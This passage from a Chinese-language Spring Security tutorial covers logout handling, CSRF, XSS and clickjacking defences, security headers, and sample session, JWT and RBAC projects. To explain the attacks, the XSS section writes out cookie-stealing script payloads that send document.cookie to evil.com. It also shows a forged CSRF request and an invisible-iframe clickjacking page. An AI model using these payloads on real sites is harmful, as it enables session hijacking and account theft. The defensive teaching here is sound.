        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

        ApiResponse<Object> error = ApiResponse.error(401, "未登录或登录已过期，请重新登录");
        objectMapper.writeValue(response.getWriter(), error);
    }
}

// 权限不足处理器（HTTP 403）
@Component
public class RestAccessDeniedHandler implements AccessDeniedHandler {

    private final ObjectMapper objectMapper;

    public RestAccessDeniedHandler(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
    }

    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       AccessDeniedException accessDeniedException) throws IOException {
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        response.setCharacterEncoding("UTF-8");
        response.setStatus(HttpServletResponse.SC_FORBIDDEN);

        ApiResponse<Object> error = ApiResponse.error(403, "权限不足，禁止访问该资源");
        objectMapper.writeValue(response.getWriter(), error);
    }
}

// 统一响应体
@Data
@AllArgsConstructor
@NoArgsConstructor
public class ApiResponse<T> {
    private Integer code;
    private String  message;
    private T       data;
    private Long    timestamp = System.currentTimeMillis();

    public static <T> ApiResponse<T> success(T data)                  { return new ApiResponse<>(200, "success", data, System.currentTimeMillis()); }
    public static <T> ApiResponse<T> success(String msg)              { return new ApiResponse<>(200, msg, null, System.currentTimeMillis()); }
    public static <T> ApiResponse<T> success(String msg, T data)      { return new ApiResponse<>(200, msg, data, System.currentTimeMillis()); }
    public static <T> ApiResponse<T> error(int code, String message)  { return new ApiResponse<>(code, message, null, System.currentTimeMillis()); }
}
```

---

## 7.6 自定义登出逻辑

```java
// 自定义登出处理器
@Component
@RequiredArgsConstructor
public class CustomLogoutHandler implements LogoutHandler {

    private final JwtTokenUtil jwtTokenUtil;
    private final StringRedisTemplate redisTemplate;
    private static final String BLACKLIST_PREFIX = "jwt:blacklist:";

    @Override
    public void logout(HttpServletRequest request, HttpServletResponse response,
                       Authentication authentication) {
        // 1. 从请求头提取 Token
        String authHeader = request.getHeader("Authorization");
        String token = jwtTokenUtil.extractTokenFromHeader(authHeader);

        if (token != null) {
            try {
                // 2. 计算 Token 剩余有效期
                long remainingMs = jwtTokenUtil.getRemainingValidityMs(token);
                if (remainingMs > 0) {
                    // 3. 将 Token 加入黑名单（有效期与 Token 剩余时间一致）
                    redisTemplate.opsForValue().set(
                        BLACKLIST_PREFIX + token,
                        "1",
                        remainingMs,
                        TimeUnit.MILLISECONDS
                    );
                }

                // 4. 清除 Redis 中的用户缓存
                String username = jwtTokenUtil.extractUsername(token);
                redisTemplate.delete("security:user:" + username);
                redisTemplate.delete("jwt:refresh:" + username);

            } catch (Exception e) {
                // 忽略异常（Token 可能已过期）
            }
        }

        // 5. 清除 SecurityContext
        SecurityContextHolder.clearContext();
    }
}

// 登出成功处理器
@Component
public class CustomLogoutSuccessHandler implements LogoutSuccessHandler {

    @Override
    public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response,
                                 Authentication authentication) throws IOException {
        response.setContentType("application/json;charset=UTF-8");
        response.setStatus(HttpServletResponse.SC_OK);
        response.getWriter().write("{\"code\":200,\"message\":\"登出成功\"}");
    }
}

// 在 SecurityFilterChain 中配置
http.logout(logout -> logout
    .logoutUrl("/api/auth/logout")
    .addLogoutHandler(customLogoutHandler)
    .logoutSuccessHandler(customLogoutSuccessHandler)
    .clearAuthentication(true)
    .invalidateHttpSession(true)
);
```
---

# Part 8: 安全防护功能

## 8.1 CSRF 防护（SynchronizerToken 模式）

### 原理图

```
SynchronizerToken 防护机制：

服务器在 Session 中存储 CSRF Token：
  session["CSRF_TOKEN"] = "random-abc-xyz-123"

在返回的页面/Cookie 中携带 CSRF Token：
  方式1（表单隐藏字段）：
    <input type="hidden" name="_csrf" value="random-abc-xyz-123">
  方式2（Cookie，适合 SPA）：
    Set-Cookie: XSRF-TOKEN=random-abc-xyz-123; Path=/

合法请求（来自我方页面）：
  POST /transfer
  Cookie: JSESSIONID=sessionId;
  Body: to=bob&amount=100&_csrf=random-abc-xyz-123  ← 携带 CSRF Token
  
  服务器验证：body._csrf == session["CSRF_TOKEN"] → 通过

攻击请求（来自第三方网站）：
  POST /transfer（来自 evil.com）
  Cookie: JSESSIONID=sessionId;  ← 浏览器自动携带（这是CSRF攻击的关键）
  Body: to=hacker&amount=99999   ← 没有 CSRF Token！
  
  服务器验证：body._csrf 为空 → 拒绝！
  
  原因：evil.com 无法通过同源策略获取到 CSRF Token 的值
```

### 现代 SPA 的 CSRF 防护

```java
// 对于前后端分离的 SPA（Single Page Application）：
// 1. 服务器在 Cookie 中写入 CSRF Token（非 httpOnly）
// 2. 前端 JS 读取 Cookie 中的 Token，在请求头中发送
// 3. 服务器验证请求头中的 Token

@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http.csrf(csrf -> csrf
        // 将 CSRF Token 写入 Cookie（不设置 httpOnly，让 JS 可以读取）
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        // 从请求头 "X-XSRF-TOKEN" 中读取 Token
        .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
    );
    return http.build();
}

// 前端 axios 配置（自动从 Cookie 读取并发送 CSRF Token）
axios.defaults.xsrfCookieName = 'XSRF-TOKEN';    // 默认值，与 Spring 一致
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';  // 默认值，与 Spring 一致

// 第一次请求会在 Cookie 中获得 XSRF-TOKEN
// 后续请求自动在 Header 中携带 X-XSRF-TOKEN: {token value}
```

---

## 8.2 XSS 防护

```
XSS（Cross-Site Scripting）跨站脚本攻击：

反射型 XSS：
  攻击者诱导用户点击链接：
  https://trusted.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
  服务端将 q 参数直接反射到 HTML 中：
  <p>搜索结果：<script>document.location=...</script></p>
  → 浏览器执行恶意脚本！

存储型 XSS：
  攻击者在留言板提交：
  <script>new Image().src='https://evil.com/?c='+document.cookie</script>
  服务端将此内容存入数据库并展示给其他用户
  → 所有查看留言的用户都中招！

Spring Security 防 XSS：
  1. 响应头 X-XSS-Protection（已被现代浏览器弃用，但仍保留）
  2. Content-Security-Policy（CSP）—— 最有效的防御手段
  3. X-Content-Type-Options: nosniff（防止 MIME 类型嗅探）
```

```java
// Spring Security XSS 防护配置
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers

        // 1. Content Security Policy（内容安全策略）—— 最重要的 XSS 防御
        .contentSecurityPolicy(csp -> csp.policyDirectives(
            // 默认只允许同源
            "default-src 'self'; " +
            // 脚本只允许同源和特定白名单
            "script-src 'self' https://cdn.jsdelivr.net https://unpkg.com; " +
            // 样式允许同源和内联（实际应尽量避免 unsafe-inline）
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
            // 图片允许同源、data URI 和 HTTPS
            "img-src 'self' data: https:; " +
            // 字体
            "font-src 'self' https://fonts.gstatic.com; " +
            // API 请求
            "connect-src 'self' https://api.myapp.com; " +
            // 禁止 <frame> 和 <iframe>
            "frame-src 'none'; " +
            // 禁止 Flash 等插件
            "object-src 'none'; " +
            // 升级不安全请求
            "upgrade-insecure-requests"
        ))

        // 2. X-Content-Type-Options（禁止 MIME 嗅探）
        .contentTypeOptions(Customizer.withDefaults())  // X-Content-Type-Options: nosniff

        // 3. X-XSS-Protection（旧版浏览器兼容）
        // Spring Security 6 默认禁用此头（现代浏览器不依赖它）
        // .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))

        // 4. Referrer-Policy（控制 Referer 信息泄露）
        .referrerPolicy(referrer -> referrer
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
        )

        // 5. Permissions-Policy（控制浏览器功能）
        .permissionsPolicy(permissions -> permissions
            .policy("camera=(), microphone=(), geolocation=(self), payment=()")
        )
    );
    return http.build();
}

// 服务端输入过滤（防止存储型 XSS）
// 方案1：使用 Jsoup 过滤 HTML
@Component
public class XssFilter {
    public String sanitize(String input) {
        if (input == null) return null;
        // 只保留白名单标签
        return Jsoup.clean(input, Safelist.relaxed()
            .addAttributes("img", "width", "height", "style")
            .addAttributes("span", "style")
        );
    }
}

// 方案2：转义特殊字符（用于纯文本场景）
import org.springframework.web.util.HtmlUtils;
String safeOutput = HtmlUtils.htmlEscape(userInput);
// < → &lt;   > → &gt;   " → &quot;   & → &amp;   ' → &#x27;
```

---

## 8.3 点击劫持防护（X-Frame-Options）

```
点击劫持（Clickjacking）攻击：

攻击者创建一个恶意页面：
  <iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0;">
  </iframe>
  <!-- 在透明 iframe 上覆盖诱骗用户点击的按钮 -->
  <button style="position:absolute; top:200px; left:150px;">点击领取奖励！</button>

用户以为在点击"领取奖励"按钮
实际上点击了透明 iframe 中的银行转账按钮！

防护：X-Frame-Options 响应头
  DENY           → 完全禁止在 frame 中显示
  SAMEORIGIN     → 只允许同源 frame（推荐）
  ALLOW-FROM uri → 允许指定来源（已被弃用）
```

```java
// Spring Security 点击劫持防护
.headers(headers -> headers
    .frameOptions(frame -> frame
        .sameOrigin()   // 只允许同源 iframe（推荐）
        // .deny()      // 完全禁止 iframe（最严格）
    )
)

// 也可以使用 Content-Security-Policy 中的 frame-ancestors 指令（更现代）
// frame-ancestors 'self'                    等同于 SAMEORIGIN
// frame-ancestors 'none'                    等同于 DENY
// frame-ancestors 'self' https://trusted.com  允许特定来源
```

---

## 8.4 HTTPS 强制（HSTS）

```
HSTS（HTTP Strict Transport Security）：

第一次访问（普通 HTTP 或 HTTPS）：
  服务器在响应头中设置：
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

浏览器记录此策略后：
  所有后续请求（在 max-age 期间内）自动升级为 HTTPS
  即使用户输入 http://myapp.com，浏览器也会自动改为 https://myapp.com
  不再经过服务器，直接在浏览器侧重定向（防止中间人攻击）

HSTS Preload：
  将域名提交到浏览器的 HSTS Preload 列表
  即使从未访问过，也会使用 HTTPS
  提交地址：https://hstspreload.org/
```

```java
// Spring Security HSTS 配置
.headers(headers -> headers
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(31536000)  // 1年（以秒为单位）
        .includeSubDomains(true)    // 包含所有子域名
        .preload(true)              // 标记可加入 preload 列表
    )
)

// application.yml 强制 HTTPS（Spring Boot Tomcat 层面）
server:
  tomcat:
    redirect-context-root: false
  # 或使用 Spring Security 配置
  
// 在 SecurityFilterChain 中强制 HTTPS 跳转
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        // 将 HTTP 请求强制重定向到 HTTPS
        .requiresChannel(channel -> channel
            .anyRequest().requiresSecure()
        );
    return http.build();
}
```

---

## 8.5 安全响应头完整配置

```java
// 完整的安全响应头配置
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        // 1. X-Frame-Options: SAMEORIGIN（防点击劫持）
        .frameOptions(frame -> frame.sameOrigin())

        // 2. X-Content-Type-Options: nosniff（防 MIME 嗅探）
        .contentTypeOptions(Customizer.withDefaults())

        // 3. Strict-Transport-Security（强制 HTTPS）
        .httpStrictTransportSecurity(hsts -> hsts
            .maxAgeInSeconds(31536000)
            .includeSubDomains(true)
        )

        // 4. Cache-Control（敏感数据防缓存）
        .cacheControl(Customizer.withDefaults())
        // 等价于：Cache-Control: no-cache, no-store, max-age=0, must-revalidate
        //         Pragma: no-cache
        //         Expires: 0

        // 5. Content-Security-Policy
        .contentSecurityPolicy(csp -> csp.policyDirectives(
            "default-src 'self'; script-src 'self'; object-src 'none'"
        ))

        // 6. Referrer-Policy
        .referrerPolicy(ref -> ref
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.NO_REFERRER_WHEN_DOWNGRADE)
        )

        // 7. Permissions-Policy
        .permissionsPolicy(perms -> perms
            .policy("geolocation=(), camera=(), microphone=()")
        )

        // 8. Cross-Origin-*（现代浏览器安全隔离）
        // Cross-Origin-Embedder-Policy: require-corp
        // Cross-Origin-Opener-Policy: same-origin
        // Cross-Origin-Resource-Policy: same-origin
        .addHeaderWriter(new StaticHeadersWriter("Cross-Origin-Opener-Policy", "same-origin"))
        .addHeaderWriter(new StaticHeadersWriter("Cross-Origin-Resource-Policy", "same-origin"))
    );

    return http.build();
}

// 最终响应头汇总（请求 /api/data 时的响应头）：
// Cache-Control: no-cache, no-store, max-age=0, must-revalidate
// Content-Security-Policy: default-src 'self'; script-src 'self'; ...
// Cross-Origin-Opener-Policy: same-origin
// Cross-Origin-Resource-Policy: same-origin
// Pragma: no-cache
// Referrer-Policy: no-referrer-when-downgrade
// Strict-Transport-Security: max-age=31536000; includeSubDomains
// X-Content-Type-Options: nosniff
// X-Frame-Options: SAMEORIGIN
// X-Permissions-Policy: geolocation=(), camera=(), microphone=()
```
---

# Part 9: 完整实战案例

## 案例1：传统 Session 认证项目

### 项目结构

```
session-auth-demo/
├── src/main/java/com/example/
│   ├── config/
│   │   └── SecurityConfig.java         ← 安全配置
│   ├── controller/
│   │   ├── AuthController.java         ← 登录/登出
│   │   └── UserController.java         ← 用户管理
│   ├── entity/
│   │   └── User.java                   ← 用户实体
│   ├── service/
│   │   └── UserDetailsServiceImpl.java ← 用户加载服务
│   └── repository/
│       └── UserRepository.java
└── src/main/resources/
    ├── templates/
    │   ├── login.html                  ← Thymeleaf 登录页
    │   └── home.html                   ← 首页
    └── application.yml
```

```java
// SecurityConfig.java（传统 Session 版）
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SessionSecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/login", "/register", "/css/**", "/js/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")           // 自定义登录页
                .usernameParameter("username")
                .passwordParameter("password")
                .defaultSuccessUrl("/home", true)
                .failureUrl("/login?error")
                .permitAll()
            )
            .logout(logout -> logout
                .logoutUrl("/logout")
                .logoutSuccessUrl("/login?logout")
                .deleteCookies("JSESSIONID")
                .invalidateHttpSession(true)
            )
            .rememberMe(remember -> remember
                .key("mySecretKey")
                .tokenValiditySeconds(7 * 24 * 3600)
                .tokenRepository(persistentTokenRepository())
                .userDetailsService(userDetailsService)
            )
            .sessionManagement(session -> session
                .maximumSessions(1)
                .expiredUrl("/login?expired")
            )
            .csrf(Customizer.withDefaults());  // 启用 CSRF

        return http.build();
    }

    @Bean
    public PersistentTokenRepository persistentTokenRepository() {
        JdbcTokenRepositoryImpl repo = new JdbcTokenRepositoryImpl();
        repo.setDataSource(dataSource);
        return repo;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

```html
<!-- login.html（Thymeleaf 模板）-->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>登录</title>
</head>
<body>
<div class="login-container">
    <h2>用户登录</h2>

    <!-- 登录失败提示 -->
    <div th:if="${param.error}" class="error">
        用户名或密码错误
    </div>
    <!-- 登出成功提示 -->
    <div th:if="${param.logout}" class="info">
        已成功退出登录
    </div>

    <!-- 登录表单（action 指向 Spring Security 处理URL）-->
    <form th:action="@{/login}" method="post">
        <!-- CSRF Token（Thymeleaf 自动注入）-->
        <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />

        <div>
            <label>用户名：</label>
            <input type="text" name="username" required />
        </div>
        <div>
            <label>密&nbsp;&nbsp;&nbsp;码：</label>
            <input type="password" name="password" required />
        </div>
        <div>
            <label>
                <input type="checkbox" name="remember-me" /> 记住我（7天）
            </label>
        </div>
        <button type="submit">登录</button>
    </form>
</div>
</body>
</html>
```

---

## 案例2：JWT 无状态认证完整项目

### 完整项目文件结构

```
jwt-auth-demo/
├── pom.xml
└── src/main/java/com/example/security/
    ├── JwtAuthApplication.java
    ├── config/
    │   ├── SecurityConfig.java
    │   └── RedisConfig.java
    ├── controller/
    │   ├── AuthController.java
    │   └── UserController.java
    ├── dto/
    │   ├── LoginRequest.java
    │   ├── LoginResponse.java
    │   ├── RegisterRequest.java
    │   └── RefreshTokenResponse.java
    ├── entity/
    │   ├── SysUser.java
    │   ├── SysRole.java
    │   └── SysPermission.java
    ├── exception/
    │   ├── GlobalExceptionHandler.java
    │   └── JwtTokenException.java
    ├── filter/
    │   └── JwtAuthenticationFilter.java
    ├── handler/
    │   ├── CustomAuthenticationEntryPoint.java
    │   └── CustomAccessDeniedHandler.java
    ├── model/
    │   └── LoginUser.java
    ├── repository/
    │   ├── SysUserRepository.java
    │   ├── SysRoleRepository.java
    │   └── SysPermissionRepository.java
    ├── service/
    │   ├── AuthService.java
    │   └── CustomUserDetailsService.java
    └── util/
        └── JwtTokenUtil.java
```

### 关键文件完整代码

```java
// AuthController.java（完整）
@RestController
@RequestMapping("/api/auth")
@RequiredArgsConstructor
@Slf4j
public class AuthController {

    private final AuthService authService;

    @PostMapping("/register")
    public ResponseEntity<ApiResponse<Void>> register(
            @Valid @RequestBody RegisterRequest request) {
        authService.register(request);
        return ResponseEntity.ok(ApiResponse.success("注册成功"));
    }

    @PostMapping("/login")
    public ResponseEntity<ApiResponse<LoginResponse>> login(
            @Valid @RequestBody LoginRequest request) {
        LoginResponse response = authService.login(request);
        return ResponseEntity.ok(ApiResponse.success("登录成功", response));
    }

    @PostMapping("/refresh")
    public ResponseEntity<ApiResponse<RefreshTokenResponse>> refreshToken(
            @RequestHeader("Refresh-Token") String refreshToken) {
        RefreshTokenResponse response = authService.refreshToken(refreshToken);
        return ResponseEntity.ok(ApiResponse.success("Token刷新成功", response));
    }

    @PostMapping("/logout")
    public ResponseEntity<ApiResponse<Void>> logout(
            @RequestHeader(value = "Authorization", required = false) String authHeader) {
        authService.logout(authHeader);
        return ResponseEntity.ok(ApiResponse.success("登出成功"));
    }

    @GetMapping("/me")
    public ResponseEntity<ApiResponse<UserInfoVO>> getCurrentUser(
            @AuthenticationPrincipal LoginUser loginUser) {
        UserInfoVO userInfo = UserInfoVO.builder()
            .userId(loginUser.getUserId())
            .username(loginUser.getUsername())
            .nickname(loginUser.getNickname())
            .avatar(loginUser.getAvatar())
            .roles(loginUser.getRoleCodes())
            .permissions(loginUser.getPermCodes())
            .build();
        return ResponseEntity.ok(ApiResponse.success(userInfo));
    }
}

// UserController.java（完整）
@RestController
@RequestMapping("/api/system/user")
@RequiredArgsConstructor
public class UserController {

    private final SysUserRepository userRepository;
    private final PasswordEncoder passwordEncoder;

    @GetMapping
    @PreAuthorize("hasAuthority('system:user:list')")
    public ResponseEntity<ApiResponse<Page<SysUser>>> listUsers(
            @RequestParam(defaultValue = "0")  int page,
            @RequestParam(defaultValue = "10") int size,
            @RequestParam(required = false)    String keyword) {

        Pageable pageable = PageRequest.of(page, size, Sort.by("createTime").descending());
        Page<SysUser> users;

        if (StringUtils.hasText(keyword)) {
            users = userRepository.findByUsernameContainingOrNicknameContaining(
                keyword, keyword, pageable);
        } else {
            users = userRepository.findByDeletedFalse(pageable);
        }

        return ResponseEntity.ok(ApiResponse.success(users));
    }

    @GetMapping("/{id}")
    @PreAuthorize("hasAuthority('system:user:list') or principal.userId == #id")
    public ResponseEntity<ApiResponse<SysUser>> getUserById(@PathVariable Long id) {
        SysUser user = userRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("用户不存在: " + id));
        return ResponseEntity.ok(ApiResponse.success(user));
    }

    @PostMapping
    @PreAuthorize("hasAuthority('system:user:add')")
    public ResponseEntity<ApiResponse<SysUser>> createUser(
            @Valid @RequestBody UserCreateDTO dto) {
        if (userRepository.existsByUsername(dto.getUsername())) {
            return ResponseEntity.badRequest()
                .body(ApiResponse.error(400, "用户名已存在"));
        }

        SysUser user = new SysUser();
        user.setUsername(dto.getUsername());
        user.setNickname(dto.getNickname());
        user.setEmail(dto.getEmail());
        user.setPassword(passwordEncoder.encode(dto.getPassword()));
        user.setStatus(1);

        SysUser saved = userRepository.save(user);
        return ResponseEntity.status(201).body(ApiResponse.success("创建成功", saved));
    }

    @PutMapping("/{id}")
    @PreAuthorize("hasAuthority('system:user:edit')")
    public ResponseEntity<ApiResponse<SysUser>> updateUser(
            @PathVariable Long id,
            @Valid @RequestBody UserUpdateDTO dto) {
        SysUser user = userRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("用户不存在"));

        user.setNickname(dto.getNickname());
        user.setEmail(dto.getEmail());
        user.setPhone(dto.getPhone());
        user.setAvatar(dto.getAvatar());

        return ResponseEntity.ok(ApiResponse.success("更新成功", userRepository.save(user)));
    }

    @DeleteMapping("/{id}")
    @PreAuthorize("hasAuthority('system:user:delete')")
    public ResponseEntity<ApiResponse<Void>> deleteUser(@PathVariable Long id) {
        SysUser user = userRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("用户不存在"));
        user.setDeleted(1);
        userRepository.save(user);
        return ResponseEntity.ok(ApiResponse.success("删除成功"));
    }

    @PutMapping("/{id}/password")
    @PreAuthorize("hasAuthority('system:user:reset') or principal.userId == #id")
    public ResponseEntity<ApiResponse<Void>> resetPassword(
            @PathVariable Long id,
            @RequestBody PasswordDTO dto) {
        SysUser user = userRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("用户不存在"));

        // 如果是用户自己修改密码，需要验证旧密码
        LoginUser loginUser = (LoginUser) SecurityContextHolder.getContext()
            .getAuthentication().getPrincipal();
        if (loginUser.getUserId().equals(id)) {
            if (!passwordEncoder.matches(dto.getOldPassword(), user.getPassword())) {
                return ResponseEntity.badRequest()
                    .body(ApiResponse.error(400, "原密码错误"));
            }
        }

        user.setPassword(passwordEncoder.encode(dto.getNewPassword()));
        userRepository.save(user);
        return ResponseEntity.ok(ApiResponse.success("密码修改成功"));
    }
}

// AuthService.java（完整）
@Service
@RequiredArgsConstructor
@Slf4j
public class AuthService {

    private final SysUserRepository userRepository;
    private final PasswordEncoder passwordEncoder;
    private final AuthenticationManager authenticationManager;
    private final CustomUserDetailsService userDetailsService;
    private final JwtTokenUtil jwtTokenUtil;
    private final StringRedisTemplate redisTemplate;

    private static final String BLACKLIST_PREFIX = "jwt:blacklist:";
    private static final String REFRESH_PREFIX   = "jwt:refresh:";

    public void register(RegisterRequest request) {
        if (userRepository.existsByUsername(request.getUsername())) {
            throw new BusinessException("用户名已存在");
        }
        if (StringUtils.hasText(request.getEmail()) &&
            userRepository.existsByEmail(request.getEmail())) {
            throw new BusinessException("邮箱已被注册");
        }

        SysUser user = new SysUser();
        user.setUsername(request.getUsername());
        user.setNickname(request.getNickname() != null ? request.getNickname() : request.getUsername());
        user.setEmail(request.getEmail());
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        user.setStatus(1);
        userRepository.save(user);
        log.info("新用户注册: {}", request.getUsername());
    }

    public LoginResponse login(LoginRequest request) {
        // 1. 认证（内部调用 UserDetailsService + PasswordEncoder）
        Authentication authentication;
        try {
            authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(), request.getPassword())
            );
        } catch (AuthenticationException e) {
            throw new BusinessException("用户名或密码错误");
        }

        // 2. 获取认证后的用户信息
        LoginUser loginUser = (LoginUser) authentication.getPrincipal();

        // 3. 生成 Token
        String accessToken  = jwtTokenUtil.generateAccessToken(loginUser);
        String refreshToken = jwtTokenUtil.generateRefreshToken(loginUser.getUsername());

        // 4. 存储 Refresh Token 到 Redis
        redisTemplate.opsForValue().set(
            REFRESH_PREFIX + loginUser.getUsername(),
            refreshToken,
            7, TimeUnit.DAYS
        );

        // 5. 更新最后登录时间和 IP（异步）
        // eventPublisher.publishEvent(new LoginSuccessEvent(loginUser));

        log.info("用户登录成功: {}", loginUser.getUsername());

        return LoginResponse.builder()
            .accessToken(accessToken)
            .refreshToken(refreshToken)
            .tokenType("Bearer")
            .expiresIn(30 * 60L)
            .username(loginUser.getUsername())
            .nickname(loginUser.getNickname())
            .avatar(loginUser.getAvatar())
            .roles(loginUser.getRoleCodes())
            .permissions(loginUser.getPermCodes())
            .build();
    }

    public RefreshTokenResponse refreshToken(String refreshToken) {
        // 1. 验证 Refresh Token
        try {
            jwtTokenUtil.validateToken(refreshToken);
        } catch (JwtTokenException e) {
            throw new BusinessException("Refresh Token 已过期，请重新登录");
        }

        // 2. 验证类型
        if (!JwtTokenUtil.TYPE_REFRESH.equals(jwtTokenUtil.extractTokenType(refreshToken))) {
            throw new BusinessException("无效的 Refresh Token");
        }

        // 3. 提取用户名
        String username = jwtTokenUtil.extractUsername(refreshToken);

        // 4. 验证 Redis 中是否存在（防止已注销的 Refresh Token 被使用）
        String stored = redisTemplate.opsForValue().get(REFRESH_PREFIX + username);
        if (!refreshToken.equals(stored)) {
            throw new BusinessException("Refresh Token 已失效，请重新登录");
        }

        // 5. 加载最新用户信息（权限可能已变更）
        LoginUser loginUser = (LoginUser) userDetailsService.loadUserByUsername(username);

        // 6. 生成新 Access Token
        String newAccessToken = jwtTokenUtil.generateAccessToken(loginUser);

        return RefreshTokenResponse.builder()
            .accessToken(newAccessToken)
            .tokenType("Bearer")
            .expiresIn(30 * 60L)
            .build();
    }

    public void logout(String authHeader) {
        String token = jwtTokenUtil.extractTokenFromHeader(authHeader);
        if (token != null) {
            try {
                // 1. 将 Access Token 加入黑名单
                long remaining = jwtTokenUtil.getRemainingValidityMs(token);
                if (remaining > 0) {
                    redisTemplate.opsForValue().set(
                        BLACKLIST_PREFIX + token, "1",
                        remaining, TimeUnit.MILLISECONDS
                    );
                }

                // 2. 删除 Refresh Token
                String username = jwtTokenUtil.extractUsername(token);
                redisTemplate.delete(REFRESH_PREFIX + username);
                redisTemplate.delete("security:user:" + username);

                log.info("用户登出: {}", username);
            } catch (Exception e) {
                log.warn("登出处理异常: {}", e.getMessage());
            }
        }
        SecurityContextHolder.clearContext();
    }
}

// GlobalExceptionHandler.java（统一异常处理）
@RestControllerAdvice
@Slf4j
public class GlobalExceptionHandler {

    @ExceptionHandler(AccessDeniedException.class)
    @ResponseStatus(HttpStatus.FORBIDDEN)
    public ApiResponse<Void> handleAccessDeniedException(AccessDeniedException e) {
        return ApiResponse.error(403, "权限不足：" + e.getMessage());
    }

    @ExceptionHandler(AuthenticationException.class)
    @ResponseStatus(HttpStatus.UNAUTHORIZED)
    public ApiResponse<Void> handleAuthenticationException(AuthenticationException e) {
        return ApiResponse.error(401, "认证失败：" + e.getMessage());
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    @ResponseStatus(HttpStatus.BAD_REQUEST)
    public ApiResponse<Map<String, String>> handleValidationException(
            MethodArgumentNotValidException e) {
        Map<String, String> errors = new LinkedHashMap<>();
        e.getBindingResult().getFieldErrors().forEach(error ->
            errors.put(error.getField(), error.getDefaultMessage()));
        return new ApiResponse<>(400, "参数校验失败", errors, System.currentTimeMillis());
    }

    @ExceptionHandler(BusinessException.class)
    @ResponseStatus(HttpStatus.BAD_REQUEST)
    public ApiResponse<Void> handleBusinessException(BusinessException e) {
        return ApiResponse.error(400, e.getMessage());
    }

    @ExceptionHandler(ResourceNotFoundException.class)
    @ResponseStatus(HttpStatus.NOT_FOUND)
    public ApiResponse<Void> handleNotFoundException(ResourceNotFoundException e) {
        return ApiResponse.error(404, e.getMessage());
    }

    @ExceptionHandler(Exception.class)
    @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)
    public ApiResponse<Void> handleException(Exception e) {
        log.error("系统异常", e);
        return ApiResponse.error(500, "系统内部错误，请联系管理员");
    }
}
```

---

## 案例3：RBAC 动态权限系统

### 权限管理 Controller

```java
@RestController
@RequestMapping("/api/system/role")
@RequiredArgsConstructor
public class RoleController {

    private final SysRoleRepository roleRepository;
    private final SysPermissionRepository permRepo;
    private final DynamicAuthorizationManager dynamicAuthManager;

    @GetMapping
    @PreAuthorize("hasAuthority('system:role:list')")
    public ResponseEntity<ApiResponse<List<SysRole>>> listRoles() {
        List<SysRole> roles = roleRepository.findByDeletedFalse();
        return ResponseEntity.ok(ApiResponse.success(roles));
    }

    @PostMapping
    @PreAuthorize("hasAuthority('system:role:add')")
    public ResponseEntity<ApiResponse<SysRole>> createRole(@RequestBody SysRole role) {
        return ResponseEntity.status(201)
            .body(ApiResponse.success("创建成功", roleRepository.save(role)));
    }

    /**
     * 给角色分配权限
     */
    @PutMapping("/{roleId}/permissions")
    @PreAuthorize("hasAuthority('system:role:edit')")
    @Transactional
    public ResponseEntity<ApiResponse<Void>> assignPermissions(
            @PathVariable Long roleId,
            @RequestBody List<Long> permissionIds) {
        SysRole role = roleRepository.findById(roleId)
            .orElseThrow(() -> new ResourceNotFoundException("角色不存在"));

        // 更新角色权限
        List<SysPermission> permissions = permRepo.findAllById(permissionIds);
        role.setPermissions(new HashSet<>(permissions));
        roleRepository.save(role);

        // 刷新权限缓存
        dynamicAuthManager.refreshPermissionMap();

        return ResponseEntity.ok(ApiResponse.success("权限分配成功"));
    }
}

// 系统管理 Controller（权限管理、菜单刷新）
@RestController
@RequestMapping("/api/system")
@RequiredArgsConstructor
public class SystemAdminController {

    private final DynamicAuthorizationManager authManager;
    private final StringRedisTemplate redisTemplate;

    /**
     * 刷新权限缓存（修改权限后调用）
     * 适合管理员在后台修改权限后刷新，不需要重启应用
     */
    @PostMapping("/refresh-permissions")
    @PreAuthorize("hasRole('SUPER_ADMIN')")
    public ResponseEntity<ApiResponse<Void>> refreshPermissions() {
        authManager.refreshPermissionMap();
        return ResponseEntity.ok(ApiResponse.success("权限缓存已刷新"));
    }

    /**
     * 强制下线指定用户（清除其缓存信息）
     */
    @PostMapping("/force-logout/{username}")
